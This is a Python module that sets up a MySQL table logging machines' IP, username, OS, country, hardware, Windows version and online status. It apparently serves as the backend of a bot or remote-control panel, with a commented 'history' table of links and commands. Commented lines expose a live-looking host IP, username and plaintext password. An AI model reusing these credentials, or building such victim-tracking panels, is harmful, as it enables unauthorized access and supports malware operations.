import sys
import time
import random
import mysql.connector

#mysql -u alex -p

# id IP OS CONTRY CPU GPU  RAM WIN_VERSION REGISTER Count_jerk

#ip VARCHAR(15), register DATETIME, os VARCHAR(50), contry VARCHAR(5),gpu VARCHAR(40),cpu VARCHAR(60), ram VARCHAR (4), win_version VARCHAR (20), time_c BIGINT
class SqlModule:

    def __init__(self, hostname, user, password, port, base_name, table_name):
        self.base_name = base_name
        self.table_name = table_name
        try:
            self.conn = mysql.connector.connect(
                host=hostname,
                port=port,
                user=user,
                password=password,
                use_unicode = True,
                charset = "utf8")


            cursor = self.conn.cursor()
            cursor.execute('SET NAMES utf8')
            cursor.execute('SET CHARACTER SET utf8')
            cursor.execute('SET character_set_connection=utf8')
        except mysql.connector.errors.DatabaseError as e:
            print('Connect to MySQL error' + str(e))
            sys.exit()

    def create_base(self):
        try:
            cursor = self.conn.cursor()
            sql_req = """CREATE DATABASE IF NOT EXISTS {} DEFAULT CHARACTER SET 'utf8'""".format(self.base_name)
            cursor.execute(sql_req)
            self.conn.commit()
        except mysql.connector.Error as error:
            print("Failed!\n Reason:\n {}".format(error))

    def delete_base(self):
        try:
            cursor = self.conn.cursor()
            sql_req = """DROP DATABASE IF EXISTS {}""".format(self.base_name)
            cursor.execute(sql_req)
        except mysql.connector.Error as error:
            print("Failed!\n Reason:\n {}".format(error))

    def create_table(self):
        try:
            cursor = self.conn.cursor()
            cursor.execute('use {}'.format(self.base_name))
            sql_req = """CREATE TABLE IF NOT EXISTS {} (id VARCHAR(30),
             ip VARCHAR(15) PRIMARY KEY, register TIMESTAMP DEFAULT CURRENT_TIMESTAMP, username VARCHAR(40), os VARCHAR(50),
              contry VARCHAR(5), gpu VARCHAR(50), cpu VARCHAR(60), ram VARCHAR (7), 
              win_version VARCHAR (20), time_c TIME, status VARCHAR(7))""".format(self.table_name)
            cursor.execute(sql_req)
        except mysql.connector.Error as error:
            print("Failed!\n Reason:\n {}".format(error))

    def add_user(self, *info_user):
        try:
            cursor = self.conn.cursor()
            cursor.execute('use {}'.format(self.base_name))
            info_user = info_user[0]
            sql_req = ''
            data = []
            if len(info_user) == 10:
                id_user = str(random.randint(1, 1000000))
                sql_req = '''INSERT INTO {} (id, ip, username,os,contry,gpu,cpu,ram,win_version,time_c, status)
                  VALUES(%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
        ON DUPLICATE KEY UPDATE time_c = %s'''.format(self.table_name)
                data = tuple([id_user] + [i for i in info_user] + [info_user[-2]])
            elif len(info_user) == 3:
                sql_req = '''UPDATE {} SET time_c = %s WHERE ip = %s'''.format(self.table_name)
                data = tuple([info_user[1], info_user[0]])

            cursor.execute(sql_req, data)
            self.conn.commit()
        except mysql.connector.Error as error:
            print("Failed! Reason:\n{}".format(error))

    def show_all_users(self):
        try:
            cursor = self.conn.cursor()
            cursor.execute('use {}'.format(self.base_name))
            sql_req = """SELECT * FROM {}""".format(self.table_name)
            cursor.execute(sql_req)
            rows = cursor.fetchall()

            return rows
        except mysql.connector.Error as error:
            print("Failed! Reason:\n{}".format(error))

    def show_users(self):
        try:
            cursor = self.conn.cursor()
            cursor.execute('use {}'.format(self.base_name))
            sql_req = """SELECT * FROM {} WHERE ((UNIX_TIMESTAMP() - time_c) < 120)""".format(self.table_name)
            cursor.execute(sql_req)
            rows = cursor.fetchall()

            return rows
        except mysql.connector.Error as error:
            print("Failed! Reason:\n{}".format(error))

#CREATE TABLE IF NOT EXISTS history (link VARCHAR(100), command VARCHAR(100));
#a = SqlModule("185.139.70.8", 'PanelFavorite', 'gjenjgnew23ad', 3306, 'basestart', 'users')
#a.delete_base()
#a.create_base()
#a.create_table()

#z = UserInfo()
#a.add_user('255.255.255.255', z.name_info(), z.location_info(), z.gpu_info(), z.cpu_info(), z.ram_info(), z.version_info(), time.time())
#print(a.show_all_users())
#ip VARCHAR(15), register DATETIME, os VARCHAR(50), contry VARCHAR(5),gpu VARCHAR(40),cpu VARCHAR(60),
# ram VARCHAR (4), win_version VARCHAR (20), time_c BIGINT
#

#a.test('loveip1')
#a.add_user('kek))')
#z=a.show_all_users()
#print(z)
#a.create_base('hello')
#a.create_table()
#a.add_user('111.222.333.444', time.time())

#a.show_all_users()


